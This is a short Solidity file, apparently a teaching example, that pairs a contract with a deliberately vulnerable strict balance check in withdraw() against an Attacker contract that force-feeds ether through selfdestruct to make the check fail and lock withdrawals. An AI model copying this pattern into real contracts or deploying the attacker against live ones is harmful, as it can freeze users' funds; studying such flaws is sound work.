// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
* @dev This contract includes an example of strict comparison of balance
* @dev which is vulnerable to force feeding.
*/ 

contract Example7 {
    mapping (address => uint256) balance;
	uint256 totalDeposit;
	
    function deposit() external payable {
        balance[msg.sender] += msg.value;
		totalDeposit += msg.value;
    }
	
	function withdraw() external {		
		// Consistency check...
		assert(totalDeposit == address(this).balance);
		totalDeposit -= balance[msg.sender];
		
		uint256 toWithdraw = balance[msg.sender];
		balance[msg.sender] = 0;// Effects	
		
		payable(msg.sender).call{value: toWithdraw}("");// Interactions
	}
}

contract Attacker {
	address payable target;
	
	constructor(address payable _target) {
		target = _target;
	}
	
	function exploit() external payable {
		require(msg.value != 0, "No value sent!");
		selfdestruct(target);
	}
}